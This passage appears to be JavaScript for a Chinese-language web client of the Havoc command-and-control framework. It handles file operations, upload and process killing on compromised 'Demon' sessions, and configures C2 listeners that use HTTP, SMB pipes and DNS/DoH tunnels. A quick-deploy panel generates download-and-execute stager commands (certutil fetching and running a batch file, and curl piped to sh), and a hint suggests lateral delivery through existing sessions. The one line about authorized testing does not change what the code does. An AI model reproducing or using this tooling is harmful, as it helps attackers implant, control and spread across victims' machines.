      <label>目标路径</label><input class="input fm-target" type="text" spellcheck="false" value="${escapeHtml(defaultTarget)}">
    </div>
    <label class="check-row"><input class="fm-overwrite" type="checkbox"> 允许覆盖已存在的目标</label>`, [
    { label: "取消", action: closeModal },
    { label: "复制", primary: true, action: async (m) => {
      const target = m.querySelector(".fm-target").value.trim();
      if (!target) { setModalError(m, "请输入目标路径"); return; }
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "复制中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/copy`, {
          method: "POST", body: { from: path, to: target, overwrite: m.querySelector(".fm-overwrite").checked },
        });
        closeModal();
        toast(`已复制到 ${target}`, "good");
        await listFiles(demon, fileDirName(target, demon));
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "复制";
      }
    } },
  ]);
  modal.querySelector(".fm-target").focus();
}

async function promptMoveTo(demon, path, entry) {
  const modal = openModal("移动到…", `
    <div class="form-grid">
      <label>源路径</label><div class="muted mono small-text">${escapeHtml(path)}</div>
      <label>目标路径</label><input class="input fm-target" type="text" spellcheck="false" value="${escapeHtml(path)}">
    </div>
    <label class="check-row"><input class="fm-overwrite" type="checkbox"> 允许覆盖已存在的目标</label>
    <p class="modal-note">可以只改目录部分实现移动；跨盘移动由 Demon 决定是否支持。</p>`, [
    { label: "取消", action: closeModal },
    { label: "移动", primary: true, action: async (m) => {
      const target = m.querySelector(".fm-target").value.trim();
      if (!target) { setModalError(m, "请输入目标路径"); return; }
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "移动中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/move`, {
          method: "POST", body: { from: path, to: target, overwrite: m.querySelector(".fm-overwrite").checked },
        });
        closeModal();
        toast(`已移动到 ${target}`, "good");
        await listFiles(demon, fileDirName(path, demon));
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "移动";
      }
    } },
  ]);
  modal.querySelector(".fm-target").focus();
}

async function promptDelete(demon, path, entry) {
  const isDir = String(entry.type).toLowerCase() === "dir";
  const modal = openModal(`删除 ${entry.name || path}？`, `
    <p class="modal-note">${isDir
      ? "目录及其中的全部内容会被删除，操作不可撤销。"
      : "文件会被直接删除，操作不可撤销。"}</p>
    ${isDir ? `<label class="check-row"><input class="fm-recursive" type="checkbox" checked> 递归删除目录及全部内容</label>` : ""}`, [
    { label: "取消", action: closeModal },
    { label: "删除", danger: true, action: async (m) => {
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "删除中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/remove`, {
          method: "POST",
          body: { path, recursive: isDir && m.querySelector(".fm-recursive") ? m.querySelector(".fm-recursive").checked : false },
        });
        closeModal();
        toast(`已删除 ${path}`, "good");
        await listFiles(demon, fileDirName(path, demon));
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "删除";
      }
    } },
  ]);
}

function showFileProps(demon, path, entry) {
  const isDir = String(entry.type).toLowerCase() === "dir";
  openModal("文件属性", `
    <div class="prop-grid">
      <span>名称</span><b>${escapeHtml(entry.name || fileBaseName(path, demon))}</b>
      <span>路径</span><b class="mono">${escapeHtml(path)}</b>
      <span>类型</span><b>${isDir ? "目录" : "文件"}</b>
      <span>大小</span><b>${escapeHtml(isDir ? "—" : (entry.size || ""))}</b>
      <span>修改时间</span><b>${escapeHtml(entry.modified || "—")}</b>
      <span>平台</span><b>${isLinuxSession(S.sessions.get(demon)) ? "Linux" : "Windows"}</b>
    </div>`, [
    { label: "复制路径", action: () => copyText(path) },
    { label: "关闭", primary: true, action: closeModal },
  ]);
}

async function uploadFiles(demon, files, dir) {
  let ok = 0;
  for (let i = 0; i < files.length; i++) {
    const file = files[i];
    setFileStatus(demon, `上传 ${i + 1}/${files.length}：${file.name}`);
    try {
      const fd = new FormData();
      fd.append("path", dir);
      fd.append("file", file, file.name);
      const res = await fetch(`/api/sessions/${encodeURIComponent(demon)}/files/upload`,
        { method: "POST", body: fd, credentials: "same-origin" });
      let data = null;
      try { data = await res.json(); } catch (e) { data = null; }
      if (!res.ok) throw new Error((data && (data.message || data.error)) || `HTTP ${res.status}`);
      ok += 1;
    } catch (err) {
      setFileStatus(demon, `上传失败：${file.name}`, true);
      toast(`上传失败 ${file.name}：${err.message}`, "error", 7000);
      await listFiles(demon, dir);
      return;
    }
  }
  setFileStatus(demon, "");
  toast(`已上传 ${ok}/${files.length} 个文件到 ${dir}`, "good");
  await listFiles(demon, dir);
}

/* ================================================================
   进程列表
   ================================================================ */
function renderProcsPane(el, demon) {
  el.innerHTML = `
    <div class="procs-wrap">
      <div class="proc-tree">
        <div class="tree-body"></div>
      </div>
      <div class="h-split procs-split" title="拖动调整宽度"></div>
      <div class="proc-main">
        <div class="data-table-wrap">
          <table class="data-table procs-table">
            <colgroup><col style="width:200px"><col style="width:70px"><col style="width:70px"><col style="width:70px"><col style="width:70px"><col></colgroup>
            <thead><tr><th>名称</th><th>PID</th><th>PPID</th><th>会话</th><th>架构</th><th>用户</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
        <div class="proc-actions"><button class="btn small refresh-btn">刷新</button></div>
      </div>
    </div>`;
  el.querySelector(".refresh-btn").addEventListener("click", () => listProcesses(demon));
  const hsplit = el.querySelector(".h-split");
  const tree = el.querySelector(".proc-tree");
  let drag = false;
  hsplit.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    drag = true;
    const wrap = el.querySelector(".procs-wrap").getBoundingClientRect();
    const move = (e) => {
      if (!drag) return;
      const w = Math.max(140, Math.min(wrap.width * 0.5, e.clientX - wrap.left));
      tree.style.flex = `0 0 ${w}px`;
      tree.style.width = `${w}px`;
    };
    const up = () => {
      drag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  const cache = S.procs.get(demon);
  if (cache) renderProcsTable(el, demon);
  else listProcesses(demon);
}

function flattenProcTree(nodes, depth, ancestorLast, out) {
  nodes.forEach((node, i) => {
    const last = i === nodes.length - 1;
    out.push({ node, depth, ancestorLast });
    if (node.children && node.children.length) {
      flattenProcTree(node.children, depth + 1, ancestorLast.concat([last]), out);
    }
  });
  return out;
}

function buildProcTree(entries) {
  const byPid = new Map();
  const roots = [];
  entries.forEach((p) => {
    const node = { pid: String(p.pid), name: p.name, children: [] };
    const parent = byPid.get(String(p.ppid));
    if (parent) parent.children.push(node);
    else roots.push(node);
    byPid.set(node.pid, node);
  });
  return flattenProcTree(roots, 0, [], []);
}

function renderProcsTable(el, demon) {
  const cache = S.procs.get(demon);
  const tbody = el.querySelector(".data-table tbody");
  if (!tbody) return;
  if (!cache) { tbody.innerHTML = `<tr><td colspan="6" class="muted">加载中…</td></tr>`; return; }
  const self = S.sessions.get(demon);
  const selfPid = self ? String(self.pid) : "";
  tbody.innerHTML = cache.entries.map((p) => {
    const cur = String(p.pid) === selfPid;
    return `<tr data-pid="${escapeHtml(p.pid)}"${cur ? ' class="current"' : ""}>
      <td class="name${cur ? " cur" : ""}">${escapeHtml(p.name)}</td>
      <td class="ctr">${escapeHtml(p.pid)}</td>
      <td class="ctr">${escapeHtml(p.ppid)}</td>
      <td class="ctr">${escapeHtml(p.session)}</td>
      <td class="ctr">${escapeHtml(p.arch)}</td>
      <td class="muted">${escapeHtml(p.user || "")}</td>
    </tr>`;
  }).join("");

  // 左侧进程树（PID: 名称），与客户端 NewTreeProcess() 相同的挂载顺序
  const treeBody = el.querySelector(".proc-tree .tree-body");
  if (!treeBody) return;
  const rows = buildProcTree(cache.entries);
  treeBody.innerHTML = rows.map((r) => {
    const cells = [];
    for (let i = 0; i < r.depth; i++) {
      const last = r.ancestorLast[i] ? ' data-last="1"' : "";
      const conn = i === r.depth - 1 ? " conn" : "";
      cells.push(`<span class="ti${conn}"${last}></span>`);
    }
    const kids = r.node.children.length > 0;
    const selfCls = "self" + (r.depth > 0 ? " child" : "");
    cells.push(`<span class="ti ${selfCls}">${kids ? '<b class="arrow"></b>' : ""}</span>`);
    const cur = r.node.pid === selfPid ? " cur" : "";
    return `<div class="tree-row${cur}" data-pid="${escapeHtml(r.node.pid)}">${cells.join("")}<span class="tt">${escapeHtml(r.node.pid)}: ${escapeHtml(r.node.name)}</span></div>`;
  }).join("");

  const setSelected = (pid) => {
    el.querySelectorAll(".procs-table tbody tr").forEach((tr) => {
      tr.classList.toggle("selected", tr.getAttribute("data-pid") === pid);
    });
    el.querySelectorAll(".proc-tree .tree-row").forEach((row) => {
      row.classList.toggle("selected", row.getAttribute("data-pid") === pid);
    });
  };
  el.querySelectorAll(".procs-table tbody tr").forEach((tr) => {
    tr.addEventListener("mousedown", () => setSelected(tr.getAttribute("data-pid")));
    tr.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      const pid = tr.getAttribute("data-pid");
      showContextMenu(ev.clientX, ev.clientY, [
        { label: `结束进程 ${pid}`, action: () => killProcess(demon, pid) },
        { label: "复制 PID", action: () => copyText(pid) },
      ]);
    });
  });
  el.querySelectorAll(".proc-tree .tree-row").forEach((row) => {
    row.addEventListener("mousedown", () => setSelected(row.getAttribute("data-pid")));
    row.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      const pid = row.getAttribute("data-pid");
      showContextMenu(ev.clientX, ev.clientY, [
        { label: "复制 PID", action: () => copyText(pid) },
      ]);
    });
  });
}

async function listProcesses(demon) {
  try {
    await api(`/api/sessions/${encodeURIComponent(demon)}/processes`, { method: "POST" });
  } catch (err) { toast(err.message, "error"); }
}

async function killProcess(demon, pid) {
  const ok = await confirmDialog(`结束进程 ${pid}？`, "该操作会向目标发送 proc kill 任务。");
  if (!ok) return;
  try {
    await api(`/api/sessions/${encodeURIComponent(demon)}/processes/kill`, { method: "POST", body: { pid } });
    toast(`已下发结束进程 ${pid}`, "warn");
  } catch (err) { toast(err.message, "error"); }
}

/* ================================================================
   监听器
   ================================================================ */
function renderListenersPane(el) {
  el.innerHTML = `
    <div class="listener-wrap">
      <div class="listener-table-wrap">
        <table class="listener-table">
          <thead><tr><th>名称</th><th>模式</th><th>监听</th><th>外连</th><th>状态</th><th>加密</th><th>连接</th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
      <div class="listener-actions">
        <button class="btn small add-btn">添加</button>
        <button class="btn small edit-btn">编辑</button>
        <button class="btn small del-btn">删除</button>
        <button class="btn small start-btn">启动</button>
        <button class="btn small stop-btn">停止</button>
        <button class="btn small relay-btn">下载中继</button>
        <button class="btn small qd-toggle">一键上线命令</button>
      </div>
      <div class="quick-deploy hidden">
        <div class="qd-grid">
          <label>暂存地址：</label>
          <input class="input qd-base" type="text" spellcheck="false">
          <div class="qd-btns"><button class="btn small qd-check">检测</button><button class="btn small qd-start">启动服务</button></div>
          <label>服务状态：</label>
          <div class="qd-status"><span class="dot"></span><span class="qd-text">未检测</span></div>
          <label>Windows：</label>
          <input class="input qd-win mono" type="text" readonly>
          <button class="btn small qd-copy">复制</button>
          <label>Linux：</label>
          <input class="input qd-linux mono" type="text" readonly>
          <button class="btn small qd-copy-linux">复制</button>
          <div class="qd-hint">Windows：下载 /swt 批处理 → 下载 demon.x64.exe 并后台启动。Linux：<code>/slt</code> 按 <code>uname -m</code> 选择 demon.x64/x86.elf，下载后 chmod + setsid 脱离当前 shell。已有 Linux 会话可直接执行 <code>shell curl -fsSL &lt;暂存地址&gt;/slt | sh</code> 横向投递。服务未运行时点「启动服务」，或在本机执行 ./start-stager.sh。仅用于已授权的测试环境。</div>
        </div>
      </div>
    </div>`;
  const baseInput = el.querySelector(".qd-base");
  let stagerHost = location.hostname;
  if (!stagerHost || stagerHost === "127.0.0.1" || stagerHost === "localhost") {
    const ips = (S.profile && S.profile.TeamserverIPs ? String(S.profile.TeamserverIPs) : "").split(",").map((x) => x.trim()).filter(Boolean);
    if (ips.length) stagerHost = ips[0];
  }
  const storedBase = S.stagerBase || "";
  const defaultBase = `http://${stagerHost}:9901`;
  baseInput.value = (!storedBase || /127\.0\.0\.1|localhost/.test(storedBase)) ? defaultBase : storedBase;
  const updateCmd = () => {
    S.stagerBase = baseInput.value.trim().replace(/\/+$/, "");
    localStorage.setItem("havoc.stagerBase", S.stagerBase);
    el.querySelector(".qd-win").value =
      `certutil.exe -urlcache -split -f ${S.stagerBase}/swt C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`;
    el.querySelector(".qd-linux").value = `curl -fsSL ${S.stagerBase}/slt | sh`;
  };
  baseInput.addEventListener("input", updateCmd);
  updateCmd();
  el.querySelector(".qd-copy").addEventListener("click", () => copyText(el.querySelector(".qd-win").value));
  el.querySelector(".qd-copy-linux").addEventListener("click", () => copyText(el.querySelector(".qd-linux").value));
  el.querySelector(".qd-check").addEventListener("click", () => refreshStager());
  el.querySelector(".qd-start").addEventListener("click", async () => {
    try { await api("/api/stager/start", { method: "POST" }); toast("已请求启动暂存服务", "good"); }
    catch (err) { toast(err.message, "error"); }
    setTimeout(refreshStager, 1200);
  });
  el.querySelector(".qd-toggle").addEventListener("click", () => {
    el.querySelector(".quick-deploy").classList.toggle("hidden");
    refreshStager();
  });
  el.querySelector(".add-btn").addEventListener("click", () => openListenerModal(null));
  const selected = () => S.selectedListener && S.listeners.get(S.selectedListener);
  el.querySelector(".edit-btn").addEventListener("click", () => {
    const l = selected();
    if (!l) { toast("请先选择一个监听器", "warn"); return; }
    if (["smb", "external"].includes(String(l.protocol || "").toLowerCase())) {
      toast("SMB/External 监听器不支持在线编辑，请删除后重建", "warn"); return;
    }
    openListenerModal(l);
  });
  el.querySelector(".del-btn").addEventListener("click", async () => {
    const l = selected();
    if (!l) { toast("请先选择一个监听器", "warn"); return; }
    if (!await confirmDialog(`删除监听器 ${l.name}？`, "这会在 teamserver 或 Web 网关停止并移除该监听器。")) return;
    try { await api(`/api/listeners/${encodeURIComponent(l.name)}`, { method: "DELETE" }); toast(`已删除 ${l.name}`, "warn"); }
    catch (err) { toast(err.message, "error"); }
  });
  el.querySelector(".start-btn").addEventListener("click", async () => {
    const l = selected();
    if (!l) { toast("请先选择一个监听器", "warn"); return; }
    if (l.kind !== "transport") { toast("原生 HTTP 监听器由 teamserver 管理，请编辑后重新保存", "warn"); return; }
    try { await api(`/api/listeners/${encodeURIComponent(l.name)}/start`, { method: "POST" }); toast(`已启动 ${l.name}`, "good"); }
    catch (err) { toast(err.message, "error"); }
  });
  el.querySelector(".stop-btn").addEventListener("click", async () => {
    const l = selected();
    if (!l) { toast("请先选择一个监听器", "warn"); return; }
    if (l.kind !== "transport") { toast("原生 HTTP 监听器由 teamserver 管理", "warn"); return; }
    if (!await confirmDialog(`停止监听器 ${l.name}？`, "停止后端口会释放，已建立的传输会话会断开。")) return;
    try { await api(`/api/listeners/${encodeURIComponent(l.name)}/stop`, { method: "POST" }); toast(`已停止 ${l.name}`, "warn"); }
    catch (err) { toast(err.message, "error"); }
  });
  el.querySelector(".relay-btn").addEventListener("click", () => {
    const l = selected();
    if (!l) { toast("请先选择一个监听器", "warn"); return; }
    openRelayDialog(l);
  });
  renderListenersTable(el);
  refreshStager();
  // 打开标签时主动同步一次，避免错过 WS 断线期间的上线/下线事件
  api("/api/listeners").then((data) => {
    const names = new Set();
    (data.listeners || []).forEach((l) => {
      names.add(l.name);
      S.listeners.set(l.name, l);
    });
    Array.from(S.listeners.keys()).forEach((name) => {
      const item = S.listeners.get(name);
      if (item && item.kind === "transport" && !names.has(name)) S.listeners.delete(name);
    });
    renderListenersTable(el);
  }).catch(() => {});
  // 服务端插件注册的协议（EV_SERVICE/SubEvent=2）也同步一次
  api("/api/service-listeners").then((data) => {
    (data.listeners || []).forEach((def) => S.serviceListeners.set(def.name, def));
  }).catch(() => {});
}

function listenerModeLabel(l) {
  return l.mode || l.protocol || "";
}

function renderListenersTable(el) {
  const containers = el ? [el] : Array.from(S.tabs.values()).filter((t) => t.kind === "listeners").map((t) => t.el);
  containers.forEach((root) => {
    const tbody = root.querySelector(".listener-table tbody");
    if (!tbody) return;
    const items = Array.from(S.listeners.values());
    tbody.innerHTML = items.map((l) => {
      const online = String(l.status).toLowerCase() === "online";
      const transport = l.kind === "transport";
      const service = !!l.service;
      const proto = String(l.protocol || "").toLowerCase();
      let listen = l.listen || `${l.host_bind || ""}:${l.port_bind || ""}`;
      let connect = l.connect || (l.hosts ? `${l.hosts}:${l.port_conn || ""}` : (l.port_conn || ""));
      if (proto === "smb") {
        listen = "\\\\.\\pipe\\" + (l.pipe_name || "");
        connect = "—";
      } else if (proto === "external") {
        listen = "POST /" + (l.endpoint || "");
        connect = "teamserver:40056";
      } else if (service) {
        if (!l.host_bind && !l.port_bind) listen = "插件托管";
        if (!connect) connect = "插件托管";
      }
      const cipher = transport ? "AES-256-GCM" : (service ? "插件定义" : "Demon AES");
      const conns = transport ? `${l.active || 0}/${l.connections || 0}` : "—";
      return `<tr data-name="${escapeHtml(l.name)}" class="${online ? "" : "offline"}">
        <td class="name">${escapeHtml(l.name)}</td>
        <td><span class="mode-tag ${transport ? "transport" : "native"}">${escapeHtml(String(listenerModeLabel(l)).toUpperCase())}</span></td>
        <td class="mono">${escapeHtml(listen)}</td>
        <td class="mono muted-cell">${escapeHtml(connect)}</td>
        <td><span class="status-pill ${online ? "online" : "offline"}"><span class="dot"></span>${online ? "在线" : "离线"}</span></td>
        <td class="mono">${cipher}</td>
        <td class="mono">${escapeHtml(conns)}</td>
      </tr>`;
    }).join("") || `<tr><td colspan="7" class="muted">暂无监听器</td></tr>`;
    tbody.querySelectorAll("tr").forEach((tr) => {
      const name = tr.getAttribute("data-name");
      if (!name) return;
      if (S.selectedListener === name) tr.classList.add("selected");
      tr.addEventListener("mousedown", () => {
        S.selectedListener = name;
        tbody.querySelectorAll("tr").forEach((r) => r.classList.toggle("selected", r === tr));
      });
      tr.addEventListener("dblclick", () => {
        const l = S.listeners.get(name);
        if (!l) return;
        if (["smb", "external"].includes(String(l.protocol || "").toLowerCase())) {
          toast("SMB/External 监听器不支持在线编辑，请删除后重建", "warn"); return;
        }
        openListenerModal(l);
      });
    });
  });
}

function listenerField(name, label, value, opts = {}) {
  const cls = ["for-transport", opts.group ? "for-" + opts.group : ""].filter(Boolean).join(" ");
  const type = opts.type || "text";
  const inputCls = ["input", opts.group ? "for-" + opts.group : ""].filter(Boolean).join(" ");
  const attrs = [
    `class="${inputCls}"`, `name="${name}"`, `type="${type}"`,
    `value="${escapeHtml(value == null ? "" : String(value))}"`,
    opts.placeholder ? `placeholder="${escapeHtml(opts.placeholder)}"` : "",
    opts.min != null ? `min="${opts.min}"` : "", opts.max != null ? `max="${opts.max}"` : "",
  ].filter(Boolean).join(" ");
  return `<label class="${cls}">${escapeHtml(label)}</label><input ${attrs}>`;
}

function teamserverIps() {
  const raw = (S.profile && S.profile.TeamserverIPs) ? String(S.profile.TeamserverIPs) : "";
  return raw.split(",").map((x) => x.trim()).filter(Boolean);
}

function splitCsv(value) {
  if (Array.isArray(value)) return value.map((x) => String(x).trim()).filter(Boolean);
  return String(value || "").split(",").map((x) => x.trim()).filter(Boolean);
}

function listEditorHtml(kind, values, placeholder) {
  const rows = (values.length ? values : [""]).map((value) => `
    <div class="list-row">
      <input class="input" value="${escapeHtml(value)}" placeholder="${escapeHtml(placeholder || "")}">
      <button type="button" class="icon-btn list-del" title="删除">×</button>
    </div>`).join("");
  return `<div class="list-editor for-native" data-list="${kind}">
    <div class="list-rows">${rows}</div>
    <div class="list-actions">
      <button type="button" class="btn small list-add">Add</button>
      <button type="button" class="btn small list-clear">Clear</button>
    </div>
  </div>`;
}

function bindListEditors(modal) {
  modal.querySelectorAll(".list-editor").forEach((box) => {
    const rows = box.querySelector(".list-rows");
    const kind = box.dataset.list;
    const bindRow = (row) => {
      const del = row.querySelector(".list-del");
      if (del) del.addEventListener("click", () => row.remove());
    };
    rows.querySelectorAll(".list-row").forEach(bindRow);
    box.querySelector(".list-add").addEventListener("click", () => {
      const row = document.createElement("div");
      row.className = "list-row";
      let value = "";
      if (kind === "hosts" && rows.querySelectorAll(".list-row").length === 0) {
        value = teamserverIps()[0] || "";
      }
      row.innerHTML = `<input class="input" value="${escapeHtml(value)}"><button type="button" class="icon-btn list-del" title="删除">×</button>`;
      bindRow(row);
      rows.appendChild(row);
      row.querySelector("input").focus();
    });
    box.querySelector(".list-clear").addEventListener("click", () => { rows.innerHTML = ""; });
  });
}

/* ---- 服务端插件注册的自定义监听器协议 ---- */
function serviceListenerDef(name) {
  const key = String(name || "").trim();
  if (!key) return null;
  if (S.serviceListeners.has(key)) return S.serviceListeners.get(key);
  const lower = key.toLowerCase();
  for (const def of S.serviceListeners.values()) {
    if (String(def.name || "").toLowerCase() === lower) return def;
  }
  return null;
}

function serviceModeDef(mode) {
  const text = String(mode || "");
  return text.startsWith("svc:") ? serviceListenerDef(text.slice(4)) : null;
}

function serviceFieldsHtml(def, editing, values) {
  const items = ((def && def.items) || []).filter((it) => (it.object || "input") === "input");
  if (!items.length) {
    return `<div class="modal-note full">该协议没有可填写的 input 字段。</div>`;
  }
  return items.map((it) => {
    const raw = values ? values[it.name] : "";
    const value = Array.isArray(raw) ? raw.join(", ") : (raw == null ? "" : String(raw));
    const readOnly = editing && !it.editable;
    return `<label>${escapeHtml(it.text || it.name)}${it.required ? ' <span class="req">*</span>' : ""}</label>
      <input class="input" data-service-field="${escapeHtml(it.name)}" value="${escapeHtml(value)}"
        placeholder="${escapeHtml(it.placeholder || "")}" ${readOnly ? "readonly" : ""}>
      ${readOnly ? `<div class="full field-hint">该字段由插件标记为不可编辑</div>` : ""}`;
  }).join("");
}

function openListenerModal(listener) {
  const editing = !!listener;
  const serviceDef = editing ? serviceListenerDef(listener.protocol) : null;
  const mode = editing
    ? (serviceDef ? `svc:${serviceDef.name}` : String(listener.mode || listener.protocol || "http").toLowerCase())
    : "http";
  const cfg = (listener && listener.config) || {};
  const randHex = (bytes) => {
    const arr = new Uint8Array(bytes);
    crypto.getRandomValues(arr);
    return Array.from(arr).map((x) => x.toString(16).padStart(2, "0")).join("");
  };
  const val = (key, fallback = "") => {
    if (editing) {
      if (key in cfg && cfg[key] !== "" && cfg[key] != null) return cfg[key];
      if (listener[key] != null && listener[key] !== "") return listener[key];
    }
    return fallback;
  };
  const currentBind = val("host_bind", "0.0.0.0");
  const bindValues = Array.from(new Set([...teamserverIps(), "127.0.0.1", "0.0.0.0", currentBind]));
  const bindOptions = bindValues.map((ip) => `<option value="${escapeHtml(ip)}"${ip === currentBind ? " selected" : ""}>${escapeHtml(ip)}</option>`).join("");
  const vkeyDefault = editing ? val("vkey", "") : randHex(12);
  const saltDefault = editing ? val("salt", "") : randHex(8);
  const serviceOptions = Array.from(S.serviceListeners.values()).map((def) =>
    `<option value="svc:${escapeHtml(def.name)}">${escapeHtml(def.name)}${def.agent ? ` (${escapeHtml(def.agent)})` : ""}</option>`
  ).join("");
  const body = `
    <div class="form-grid listener-form">
      <label>名称</label><input class="input" name="name" value="${escapeHtml(editing ? listener.name : "")}" ${editing ? "disabled" : ""}>
      <label>模式</label>
      <select class="input" name="mode" ${editing ? "disabled" : ""}>
        <optgroup label="Havoc 原生">
          <option value="http">HTTP</option><option value="https">HTTPS</option>
          <option value="smb">SMB（命名管道）</option>
          <option value="external">External（第三方 C2 端点）</option>
        </optgroup>
        <optgroup label="加密传输（Web 网关）">
          <option value="tcp">TCP</option><option value="kcp">KCP（可靠 UDP）</option>
          <option value="udp">UDP</option><option value="ws">WebSocket</option>
          <option value="dns">DNS</option><option value="doh">DoH</option>
          <option value="dot">DoT</option><option value="oss">OSS</option>
        </optgroup>
        <optgroup label="服务端插件监听器" class="service-optgroup">${serviceOptions}</optgroup>
      </select>
      <div class="full mode-desc"></div>

      <div class="full section-head for-native">HTTP(S) 原生监听器</div>
      <label class="for-native">绑定地址</label>
      <select class="input for-native" name="host_bind">${bindOptions}</select>
      <label class="for-native">绑定端口</label><input class="input for-native" name="port_bind" value="${escapeHtml(val("port_bind", "8080"))}">
      <label class="for-native">回连端口</label><input class="input for-native" name="port_conn" value="${escapeHtml(val("port_conn", "8080"))}">
      <label class="for-native">回调主机</label>
      ${listEditorHtml("hosts", (() => {
        const list = splitCsv(val("hosts", ""));
        return list.length ? list : (editing ? [] : [teamserverIps()[0] || "192.168.121.132"]);
      })(), "192.168.121.132 / c2.example.com")}
      <label class="for-native">轮询方式</label>
      <select class="input for-native" name="host_rotation">
        <option value="round-robin">round-robin</option><option value="random">random</option>
      </select>
      <label class="for-native">请求头</label>
      ${listEditorHtml("headers", splitCsv(val("headers", "Accept: */*")), "Accept: */*")}
      <label class="for-native">路径 (URI)</label>
      ${listEditorHtml("uris", splitCsv(val("uris", "/api/v1/status")), "/api/v1/status")}
      <label class="for-native">User-Agent</label><input class="input for-native" name="user_agent" value="${escapeHtml(val("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"))}">
      <label class="for-native">Host 头</label><input class="input for-native" name="host_header" value="${escapeHtml(val("host_header", ""))}">
      <div class="full section-head for-native">载荷代理（可选，配合传输中继器）</div>
      <label class="for-native">启用代理</label>
      <select class="input for-native" name="proxy_enabled">
        <option value="false">不启用</option><option value="true">启用</option>
      </select>
      <label class="for-native">代理类型</label>
      <select class="input for-native" name="proxy_type">
        <option value="http">HTTP</option><option value="socks5">SOCKS5</option>
      </select>
      <label class="for-native">代理主机</label><input class="input for-native" name="proxy_host" value="${escapeHtml(val("proxy_host", ""))}" placeholder="127.0.0.1">
      <label class="for-native">代理端口</label><input class="input for-native" name="proxy_port" value="${escapeHtml(val("proxy_port", ""))}" placeholder="1080">
      <label class="for-native">代理用户名</label><input class="input for-native" name="proxy_username" value="${escapeHtml(val("proxy_username", ""))}">
      <label class="for-native">代理密码</label><input class="input for-native" name="proxy_password" type="password" value="${escapeHtml(val("proxy_password", ""))}">

      <div class="full modal-note hidden native-edit-note">
        teamserver 的 ListenerEdit 只应用 User-Agent、请求头、URI、代理；
        回调主机/绑定地址/端口/轮换方式/Host 头不会重新绑定（与客户端行为一致，改这些请删除后重建）。
      </div>

      <div class="full section-head for-smb">SMB 命名管道监听器</div>
      <label class="for-smb">管道名称</label><input class="input for-smb" name="pipe_name" value="${escapeHtml(val("pipe_name", "demon_pipe"))}" placeholder="demon_pipe">
      <div class="full modal-note for-smb">
        SMB 监听器不绑定本地端口。管道名称会写入载荷，由父级 Demon 在目标上创建
        <code>\\\\.\\pipe\\&lt;名称&gt;</code>，供子载荷/横向会话连接；适合枢轴，不需要 teamserver 开端口。
      </div>

      <div class="full section-head for-external">External C2 端点</div>
      <label class="for-external">端点路径</label><input class="input for-external" name="endpoint" value="${escapeHtml(val("endpoint", "external"))}" placeholder="external">
      <div class="full modal-note for-external">
        注册到 teamserver <code>https://&lt;teamserver&gt;:40056/&lt;端点&gt;</code> 的 <code>POST</code>（单个路径段，不含 /）。
        用于第三方 C2 / 自定义 Agent 对接，<b>不能生成 Demon 载荷</b>。
      </div>

      <div class="full section-head for-service">服务端插件监听器</div>
      <div class="full service-fields for-service" data-service-fields></div>
      <div class="full modal-note for-service">
        字段由服务端插件通过 <code>ListenerAdd</code> 注册（<code>Items</code>），创建时原样透传给插件；
        带 <span class="req">*</span> 的字段必填。
      </div>
      <div class="full modal-note for-service service-edit-note hidden">
        teamserver 的 <code>ListenerEdit</code> 只实现 HTTP/HTTPS，插件监听器保存不会生效；
        如需修改请删除后重建。
      </div>

      <div class="full section-head for-transport">加密传输监听器（HTP/1 · AES-256-GCM）</div>
      <label class="for-transport">监听地址</label><input class="input for-transport" name="listen_host" value="${escapeHtml(val("listen_host", "0.0.0.0"))}">
      <label class="for-transport">监听端口</label><input class="input for-transport" name="listen_port" type="number" min="1" max="65535" value="${escapeHtml(val("listen_port", "9001"))}">
      <label class="for-transport">外连地址</label><input class="input for-transport" name="connect_host" value="${escapeHtml(val("connect_host", "127.0.0.1"))}" placeholder="对外 IP / 域名">
      <label class="for-transport">外连端口</label><input class="input for-transport" name="connect_port" type="number" min="1" max="65535" value="${escapeHtml(val("connect_port", "9001"))}">
      <label class="for-transport">上游地址</label><input class="input for-transport" name="upstream_host" value="${escapeHtml(val("upstream_host", "127.0.0.1"))}">
      <label class="for-transport">上游端口</label><input class="input for-transport" name="upstream_port" type="number" min="1" max="65535" value="${escapeHtml(val("upstream_port", "8080"))}">
      ${listenerField("ws_path", "WS 路径", val("ws_path", "/ws"), { group: "ws" })}
      ${listenerField("dns_domain", "隧道域名", val("dns_domain", ""), { group: "dns", placeholder: "t.example.com" })}
      ${listenerField("public_dns", "公共 DNS", val("public_dns", ""), { group: "dns", placeholder: "8.8.8.8:53 / https://dns.alidns.com/dns-query" })}
      ${listenerField("oss_url", "OSS URL", val("oss_url", ""), { group: "oss", placeholder: "http://host:9000（留空=本监听器）" })}
      ${listenerField("oss_prefix", "OSS 前缀", val("oss_prefix", "havoc"), { group: "oss" })}
      <label class="for-transport">通信密钥 Vkey</label>
      <div class="for-transport input-with-btn">
        <input class="input" name="vkey" value="${escapeHtml(vkeyDefault)}">
        <button type="button" class="btn small gen-vkey">生成</button>
      </div>
      <label class="for-transport">加密盐 Salt</label>
      <div class="for-transport input-with-btn">
        <input class="input" name="salt" value="${escapeHtml(saltDefault)}">
        <button type="button" class="btn small gen-salt">生成</button>
      </div>
      <label class="for-transport">压缩 / 填充</label>
      <div class="for-transport inline-opts">
        <label class="check"><input type="checkbox" name="compress" ${val("compress", true) ? "checked" : ""}> zlib 压缩</label>
